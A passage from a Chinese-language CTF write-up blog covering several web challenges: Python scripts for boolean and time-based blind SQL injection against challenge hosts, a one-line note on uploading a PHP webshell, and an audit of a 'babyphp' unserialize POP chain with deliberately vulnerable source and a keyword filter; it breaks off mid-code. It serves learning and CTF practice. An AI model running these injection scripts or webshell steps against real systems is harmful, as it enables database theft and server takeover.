class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print('*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'window.location.href="./zhaopin.php"'</span> in html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            <span class="keyword">print</span>(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">def get_database():</span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    <span class="keyword">print</span>(database)</span><br><span class="line"></span><br><span class="line">def get_tabls(db):</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\''</span>+db+<span class="string">'\')'</span></span><br><span class="line">    tables=binsea(s_payload)</span><br><span class="line"></span><br><span class="line">def get_columns(table):</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\''</span>+table+<span class="string">'\')'</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line">def get_data(columns,table):</span><br><span class="line">    s_payload=<span class="string">'select(group_concat('</span>+columns+<span class="string">'))from('</span>+table+<span class="string">')'</span></span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_database() #nzhaopin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_tabls('nzhaopin') #backup,flag,user</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_columns('flag') #id,flaaag</span></span><br><span class="line"></span><br><span class="line">get_data(<span class="string">'flaaag'</span>,<span class="string">'flag'</span>) <span class="comment">#flag&#123;04418836-27b8-4f85-8c53-74f7e3e53350&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h1><p>直接上传php后缀，一句话木马，蚁剑链接，执行/readflag</p>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment"># flag在fl4g里</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'waf.php'</span>;</span><br><span class="line">    header(<span class="string">"Content-type: text/html; charset=utf-8"</span>); </span><br><span class="line">    $db = <span class="keyword">new</span> mysql();</span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($id) &#123;</span><br><span class="line">        <span class="keyword">if</span>(check_sql($id))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql = <span class="string">"select * from flllllllag where id=$id"</span>;</span><br><span class="line">            $db-&gt;query($sql);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>题目给出了源码，经过测试过滤了如下字符</p>
<p><img src="/pic/110.png" alt=""></p>
<p>附上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">'http://c4c11f9e99ba4142b9bfc8ed760a65a985f476a30a93485e.changame.ichunqiu.com/?id=0||'</span>+payload+<span class="string">'%23'</span></span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="comment"># return html</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    result=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">70</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">            payload=<span class="string">"if(ascii(substr(fl4g, %d, 1)) ^ %d, sleep(0), sleep(2))"</span> %(x,c)</span><br><span class="line">            time1 = time.time()</span><br><span class="line">            get(payload)</span><br><span class="line">            time2 = time.time()</span><br><span class="line">            sec = time2 - time1</span><br><span class="line">            <span class="comment"># print(sec,' ',chr(c))</span></span><br><span class="line">            <span class="keyword">if</span> sec &gt;=<span class="number">1.5</span>:</span><br><span class="line">                result+=chr(c)</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><p>打开还是一个登入界面，访问<a href="http://www.zip发现源码" target="_blank" rel="noopener">www.zip发现源码</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"lib.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.$_GET[<span class="string">'action'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//lib.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">'select id,password from user where username=?'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;  </span><br><span class="line">        $_SESSION[<span class="string">'login'</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的ID是"</span>.$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你好！"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>], $Info, <span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt; </span><br><span class="line">&lt;title&gt;login&lt;/title&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">	&lt;form action=<span class="string">"login.php"</span> method=<span class="string">"post"</span> style=<span class="string">"margin-top: 300"</span>&gt;</span><br><span class="line">		&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;</span><br><span class="line">		&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;</span><br><span class="line">        		&lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> placeholder=<span class="string">"UserName"</span> required&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;input type=<span class="string">"password"</span> style=<span class="string">"margin-top: 20"</span> name=<span class="string">"password"</span> placeholder=<span class="string">"password"</span> required&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;button style=<span class="string">"margin-top:20;"</span> type=<span class="string">"submit"</span>&gt;登录&lt;/button&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;img src=<span class="string">'img/1.jpg'</span>&gt;大家记得做好防护&lt;/img&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$user=<span class="keyword">new</span> user();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;br&gt;Damn you, hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Damn you, hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$user-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大意就是获取admin的密码登入就可以拿到flag。主要审计是lib.php</p>
<p>当时审的时候没有注意到<code>__toString</code>这个魔法方法，快结束的时候才注意到。主要还是太菜了</p>
<p>____toString:在 PHP 5.2.0 之前，__toString() 方法只有在直接使用于 <a href="http://php.net/manual/zh/function.echo.php" target="_blank" rel="noopener">echo</a> 或 <a href="http://php.net/manual/zh/function.print.php" target="_blank" rel="noopener">print</a> 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 <a href="http://php.net/manual/zh/function.printf.php" target="_blank" rel="noopener">printf()</a>，使用 <em>%s</em> 修饰符），但不能用于非字符串环境（如使用 <em>%d</em> 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 <code>E_RECOVERABLE_ERROR</code> 级别的错误。</p>
<p>index.php是注入不了的。只能在update.php想办法</p>
<p>user.php中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br></pre></td></tr></table></figure>

<p>去查看user类的update方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>], $Info, <span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里有unserialize函数，且$this-&gt;getNewinfo()可控，存在序列化漏洞</p>
<p>跳转到getNewinfo方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再跳转到Info类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里如果$this-&gt;CtrlCase是dbCtrl类的实例魔法方法__call可以调用到dbCtrl::logon（）</p>
<p>且在User::getNewInfo方法中调用了一个safe过滤函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br></pre></td></tr></table></figure>

<p>存在序列化字符串逃逸漏洞</p>
<p>执行完后，回到User::update方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>], $Info, <span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跳转到UpdateHelper类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果$this-&gt;sql是一个类对象会触发User::__toString方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有update方法的只有dbCtrl类，但是Info类中有一个魔法调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果让User类中的$this-&gt;nickname为dbCtrl类的实例就调用到dbCtrl::login方法，而且$sql可控</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 